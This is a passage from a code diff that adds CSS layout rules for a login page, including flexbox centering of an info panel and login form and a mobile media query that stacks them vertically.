+    justify-content: center;
+    align-items: flex-start;
+    gap: 50px;
+    max-width: 1100px;
+    margin: 40px auto;
+    padding: 20px;
+}
+
+.login-info-content {
+    flex: 1;
+    max-width: 450px;
+}
+
+#login-form-wrapper {
+    flex: 0 0 350px;
+}
+
+#login-form-table {
+    width: 100%;
+}
+
+/* Mobile */
+@media (max-width: 768px) {
+    #loginContentCell {
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .login-info-content,
+    #login-form-wrapper {
+        max-width: 100%;
+        width: 100%;
+    }
+}
+
 </style>
 
